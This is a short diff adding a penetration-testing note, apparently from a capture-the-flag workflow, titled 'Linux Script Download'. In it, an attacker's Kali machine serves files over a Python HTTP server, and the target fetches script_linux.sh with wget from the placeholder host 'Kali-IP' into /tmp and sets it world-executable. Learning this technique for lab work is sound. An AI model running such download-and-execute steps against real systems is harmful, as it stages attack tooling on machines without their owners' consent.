@@ -1,0 +1,9 @@
+
+Linux Script Download
+
+cd /var/www/html
+python3 -m http.server
+
+cd /tmp
+wget http://Kali-IP/linux-script/script_linux.sh
+chmod 777 script_linux.sh 
